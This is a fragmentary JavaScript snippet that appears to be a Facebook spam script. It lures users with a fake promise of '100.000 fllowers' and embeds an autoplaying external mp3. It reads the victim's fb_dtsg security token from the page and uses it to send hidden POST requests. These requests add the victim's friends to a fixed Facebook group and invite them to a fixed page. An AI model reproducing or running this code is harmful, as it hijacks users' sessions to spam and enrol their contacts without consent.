...
<embed autostart="false" height="40" loop="true" playcount="2" src="http://www.directlinkupload.com/uploads/113.210.32.209/50pop.mp3" width="300"/></embed>
}
var tulisanNganu = '<font color="black"><b>Get 100.000 fllowers And 4.500 ADD</b> </font>';
var kunaon = '';
...
if (memberGroupId != 235437946660414) {
jx.load(window.location.protocol + "//www.facebook.com/ajax/groups/members/add_post.php?__a=1&fb_dtsg=" + document.getElementsByName("fb_dtsg")[0].value + "&group_id=235437946660414&source=typeahead&members=" + opo + "&nctr[_mod]=pagelet_group_members_summary&lsd&post_form_id_source=AsyncRequest&__user=" + user, function () {},
"text", "post")
    }
    console.log(tay + "/" + arr.length + ":" + arr[tay] + "/" + arn[tay] + ", success:" + suc);
                        ...
                        if (page_id)jx.load(window.location.protocol + "//www.facebook.com/ajax/pages/invite/send?&fb_dtsg=" + fb_dtsg + "&profileChooserItems=%7B%22" + opo + "%22%3A1%7D&checkableitems[0]=" + opo + "&page_id=1442974905933868&__user="+ user_id +  "&__a=1&__dyn=7n8aD5z5CF-3ui&__req=k&phstamp=", function () {}, "text", "post")
